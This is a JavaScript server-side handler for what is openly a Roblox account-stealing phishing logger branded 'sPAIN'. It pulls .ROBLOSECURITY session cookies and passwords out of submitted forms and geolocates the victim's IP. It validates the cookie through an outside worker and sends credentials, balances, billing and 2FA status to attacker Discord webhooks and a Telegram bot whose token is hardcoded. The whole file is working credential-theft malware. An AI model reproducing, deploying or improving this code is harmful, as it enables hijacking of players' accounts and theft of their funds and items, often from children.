// api/submit.js
const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
const TG_CHAT     = process.env.TG_CHAT  || '7538845070';
const WORKER_URL  = 'https://holy-truth-3129.notrllyme133.workers.dev/';

const WH_NAME   = 'sPAIN';
const WH_AVATAR = 'https://github.com/SOCCRETS/imhgrl/blob/main/PAINisAbeautifulTHING.webp?raw=true';

// ── Redis ─────────────────────────────────────────────────────────────────────
async function redisGet(key) {
  try {
    const res  = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, { headers: { Authorization: `Bearer ${REDIS_TOKEN}` } });
    const json = await res.json();
    if (!json.result) return null;
    let r = json.result;
    if (typeof r === 'string') { try { r = JSON.parse(r); } catch { return null; } }
    if (r && typeof r.value === 'string' && !r.webhook) { try { r = JSON.parse(r.value); } catch {} }
    return r || null;
  } catch { return null; }
}

// ── Geo ───────────────────────────────────────────────────────────────────────
async function getIpGeo(ip) {
  try {
    if (!ip || ip === 'Unknown') return null;
    const ctrl = new AbortController();
    const t    = setTimeout(() => ctrl.abort(), 3000);
    const r    = await fetch(`https://freeipapi.com/api/json/${ip}`, { signal: ctrl.signal });
    clearTimeout(t);
    const d = await r.json();
    return { city: d.cityName, regionName: d.regionName, country: d.countryName, countryCode: d.countryCode, isp: d.isp };
  } catch { return null; }
}

// ── Worker call ───────────────────────────────────────────────────────────────
async function getInfo(cookie) {
  try {
    const r = await fetch(WORKER_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cookie })
    });
    if (!r.ok) return null;
    const d = await r.json();
    return d.valid ? d : null;
  } catch { return null; }
}

// ── Tg ────────────────────────────────────────────────────────────────────────
async function tgSend(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
    });
  } catch (_) {}
}

// ── Cookie extraction ─────────────────────────────────────────────────────────
const WARN = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
function extractCookie(raw) {
  if (!raw) return null;
  const s = String(raw).trim();
  const m1 = s.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_[\w\-.]+)/); if (m1) return m1[1];
  const m2 = s.match(/_\|WARNING[^|]*\|_([\w\-.]+)/);                    if (m2) return WARN + m2[1];
  const m3 = s.match(/\|_([\w\-]{50,})/);                                if (m3) return WARN + m3[1];
  if (s.length >= 200 && /^[a-zA-Z0-9\-_.]+$/.test(s)) return WARN + s;
  return null;
}
function findCookie(slots) {
  for (const val of Object.values(slots || {})) {
    const c = extractCookie(String(val || ''));
    if (c) return c;
  }
  return null;
}
function findPassword(slots, cookie) {
  for (const val of Object.values(slots || {})) {
    const v = String(val || '').trim();
    if (!v || v === cookie) continue;
    if (extractCookie(v)) continue;          // skip if it's also a cookie
    if (v.length >= 4 && v.length <= 128) return v;
  }
  return null;
}

// ── Body parser ───────────────────────────────────────────────────────────────
function parseBody(raw) {
  if (!raw) return {};
  if (typeof raw === 'object' && !Buffer.isBuffer(raw)) return raw;
  try { return JSON.parse(Buffer.isBuffer(raw) ? raw.toString('utf8') : String(raw)); }
  catch { return {}; }
}

// ── Country flags ─────────────────────────────────────────────────────────────
const FLAGS = {
  'United States':'🇺🇸','United Kingdom':'🇬🇧','Canada':'🇨🇦','Australia':'🇦🇺',
  'Germany':'🇩🇪','France':'🇫🇷','Netherlands':'🇳🇱','Sweden':'🇸🇪','Norway':'🇳🇴',
  'Philippines':'🇵🇭','Indonesia':'🇮🇩','Singapore':'🇸🇬','Malaysia':'🇲🇾','India':'🇮🇳',
  'Japan':'🇯🇵','South Korea':'🇰🇷','Brazil':'🇧🇷','Mexico':'🇲🇽','New Zealand':'🇳🇿',
  'Ireland':'🇮🇪','South Africa':'🇿🇦','Denmark':'🇩🇰','Finland':'🇫🇮','Poland':'🇵🇱',
  'Spain':'🇪🇸','Italy':'🇮🇹','Russia':'🇷🇺','Turkey':'🇹🇷','Saudi Arabia':'🇸🇦','UAE':'🇦🇪'
};
function flag(country) { return FLAGS[country] || '🌐'; }
function fmt(n) { return Number(n || 0).toLocaleString(); }

// ── Discord ───────────────────────────────────────────────────────────────────
async function discordSend(url, payload) {
  if (!url?.includes('discord.com/api/webhooks')) return;
  try {
    await fetch(url, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: WH_NAME, avatar_url: WH_AVATAR, ...payload })
    });
  } catch (_) {}
}

async function discordChunked(url, text) {
  let rem = text; let first = true;
  while (rem.length > 0) {
    const chunk = rem.substring(0, 1990); rem = rem.substring(1990);
    await discordSend(url, {
      content: first
        ? '```\n' + chunk + (rem.length === 0 ? '\n```' : '')
        : chunk  + (rem.length === 0 ? '\n```' : '')
    });
    first = false;
  }
}

// ── Build the rich embed ──────────────────────────────────────────────────────
function buildHitEmbed({ info, password, ip, geo, now, pName, parentSlug, slug, isDH, refreshUrl }) {
  const victimCountry = geo?.country || 'Unknown';
  const victimFlag    = flag(victimCountry);
  const accCountry    = info.accCountry || 'Unknown';
  const accFlag       = info.accFlag    || '🌐';

  // Truncate cookie for the field (Discord field max 1024)
  const cookieDisplay = info._cookie
    ? (info._cookie.length > 900 ? info._cookie.substring(0, 900) + '…' : info._cookie)
    : 'N/A';

  const fields = [
    {
      name:   '👤 Username',
      value:  `\`${info.username}\``,
      inline: true
    },
    {
      name:   '🔐 Password',
      value:  `\`${password || 'N/A'}\``,
      inline: true
    },
    {
      name:   '📊 Account Stats',
      value:  `\`Account Age:\` \`${fmt(info.ageDays)} Days\``,
      inline: false
    },
    {
      name:   '📍 Locations',
      value:  `• \`Account:\` ${accCountry} ${accFlag}\n• \`Victim:\` ${victimCountry} ${victimFlag}\n• \`IP:\` \`${ip}\`\n• \`ISP:\` ${geo?.isp || 'Unknown'}`,
      inline: false
    },
    {
      name:   '💳 Billing',
      value:  `Credit: ${fmt(info.credit)} ${info.creditCurr || '$'}\nPayments: ${info.payCount || 0}`,
      inline: true
    },
    {
      name:   '👥 Groups',
      value:  `Balance: ${fmt(info.groupBalance)}\nPending: ${fmt(info.groupPending)}\nOwned: ${info.groupsOwned}`,
      inline: true
    },
    {
      name:   '⚙️ Settings',
      value:  `Email: ${info.emailSet ? 'True ✅' : 'False ❌'}\nVerified: ${info.emailVerified ? 'True ✅' : 'Unset ❌'}\n2FA: ${info.tfaMethods === 'Disabled' ? 'Disabled ❌' : `${info.tfaMethods} ✅`}`,
      inline: true
    },
    {
      name:   '💰 Account Funds',
      value:  `Balance: ${fmt(info.robux)}\nPending: ${fmt(info.pendingRobux)}`,
      inline: true
    },
    {
      name:   '🛒 Purchases',
      value:  `Limiteds: ${info.limitedsCount}\nSummary: ${fmt(info.rap)}`,
      inline: true
    },
    {
      name:   '🎮 Gamepasses Played',
      value:  `Pet Simulator 99 → ${info.ps99 || 0} ${info.ps99 ? '✅' : '❌'}\nAdopt Me → ${info.adoptMe || 0} ${info.adoptMe ? '✅' : '❌'}\nMurder Mystery 2 → ${info.mm2 || 0} ${info.mm2 ? '✅' : '❌'}`,
      inline: false
    },
    {
      name:   '🔐 ROBLOSECURITY',
      value:  `\`${cookieDisplay}\``,
      inline: false
    }
  ];

  // Add DH info if dualhook
  if (isDH) {
    fields.splice(2, 0, {
      name:   '🎣 Dualhook',
      value:  `Parent: \`${parentSlug}\`\nChild: \`${slug}\``,
      inline: true
    });
  }

  const descLinks = [];
  if (refreshUrl) descLinks.push(`[Refresh Cookie 🍪](${refreshUrl})`);
  descLinks.push(`[Profile 👤](https://www.roblox.com/users/${info.id}/profile)`);

  return {
    title:       `🧑 ${info.displayName || info.username} ${info.ageBracket || '13+'}`,
    description: `:fire: \`sPAIN\` :fire:\n\n${descLinks.join(' | ')}`,
    color:       5793266,
    fields,
    footer:      { text: `sPAIN Logger • ${pName} • ${now}` },
    thumbnail:   { url: info.avatarUrl },
    timestamp:   now
  };
}

// ── Troll embed ───────────────────────────────────────────────────────────────
function buildTrollEmbed({ ip, geo, now, pName, parentSlug, slug, isDH }) {
  const victimCountry = geo?.country || 'Unknown';
  const fields = [
    { name: '🌐 IP',       value: `\`${ip}\``,          inline: true  },
    { name: '📍 Location', value: victimCountry,          inline: true  },
    { name: '🗺️ ISP',      value: geo?.isp || 'Unknown', inline: true  },
    { name: '🕐 Time',     value: now,                   inline: false }
  ];
  if (isDH) {
    fields.push({ name: '🎣 Dualhook', value: `Parent: \`${parentSlug}\`\nChild: \`${slug}\``, inline: false });
  }
  return {
    title:       '⚠️ Wrong Cookie — Troll Detected',
    description: isDH
      ? `<a:emoji_17:1508694920972468347> ${parentSlug} <a:emoji_17:1508694920972468347>`
      : '<a:emoji_17:1508694920972468347> s.PAIN <a:emoji_17:1508694920972468347>',
    color:       0xff3333,
    fields,
    footer:      { text: `sPAIN Logger • ${pName}` },
    timestamp:   now
  };
}

// ── Handler ───────────────────────────────────────────────────────────────────
export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST')   return res.status(405).json({ error: 'Method not allowed' });

  const body = parseBody(req.body);
  const { slug, slots } = body;
  if (!slug)  return res.status(400).json({ error: 'slug is required' });
  if (!slots) return res.status(400).json({ error: 'slots is required' });

  const record = await redisGet(`slot:${slug}`);
  if (!record)         return res.status(404).json({ error: 'Page not found' });
  if (!record.webhook) return res.status(500).json({ error: 'No webhook configured' });

  const ip     = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.headers['x-real-ip'] || 'Unknown';
  const now    = new Date().toISOString();
  const pName  = record.displayName || slug;
  const cookie = findCookie(slots);
  const pass   = findPassword(slots, cookie);
  const isDH   = !!record.dualhookParent;

  // Collect webhooks
  const webhooks    = [record.webhook];
  let   parentSlug  = record.dualhookParent || null;
  if (isDH) {
    try {
      const parent = await redisGet(`slot:${record.dualhookParent}`);
      if (parent?.webhook && parent.webhook !== record.webhook) webhooks.push(parent.webhook);
    } catch (_) {}
  }

  // Geo + worker in parallel — both start immediately
  const [geo, info] = await Promise.all([
    getIpGeo(ip),
    cookie ? getInfo(cookie) : Promise.resolve(null)
  ]);

  // ── No cookie or invalid cookie ───────────────────────────────────────────
  if (!cookie || !info) {
    const trollEmbed = buildTrollEmbed({ ip, geo, now, pName, parentSlug, slug, isDH });
    await Promise.all(webhooks.map(wh => discordSend(wh, { content: '@everyone', embeds: [trollEmbed] })));
    // Still send raw cookie even if rejected — it's there for reference
    if (cookie) await Promise.all(webhooks.map(wh => discordChunked(wh, cookie)));
    await tgSend(`⚠️ <b>${cookie ? 'INVALID' : 'NO'} COOKIE — ${pName}</b>\n🌐 <code>${ip}</code>\n📍 ${geo?.country || 'Unknown'}\n🗺️ ${geo?.isp || 'Unknown'}`);
    return res.status(200).json({ success: true });
  }

  // ── Valid hit ─────────────────────────────────────────────────────────────
  // Attach cookie to info for field display
  info._cookie = cookie;

  const refreshUrl = `https://spain-tools.vercel.app/r/${Math.random().toString(36).slice(2,10)+Date.now().toString(36)}`;
  const hitEmbed   = buildHitEmbed({ info, password: pass, ip, geo, now, pName, parentSlug, slug, isDH, refreshUrl });

  for (const wh of webhooks) {
    await discordSend(wh, { content: '@everyone', embeds: [hitEmbed] });
    // Send full cookie as plain text if it was truncated in the field
    if (cookie.length > 900) await discordChunked(wh, cookie);
    // Send PowerShell
    if (info.powershell) {
      await discordSend(wh, { content: '```powershell\n' + info.powershell.substring(0, 1990) + '\n```' });
    }
  }

  await tgSend([
    `✅ <b>HIT — ${info.username} ${info.ageBracket || '13+'}</b>`,
    `💰 ${fmt(info.robux)} R$ | RAP: ${fmt(info.rap)}`,
    `👥 Groups: ${info.groupsOwned} | Balance: ${fmt(info.groupBalance)}`,
    `🌐 <code>${ip}</code> — ${geo?.country || '?'}`,
    `🗺️ ${geo?.isp || '?'}`,
    `📄 ${pName}`,
    `🔄 ${refreshUrl}`
  ].join('\n'));

  return res.status(200).json({ success: true });
}
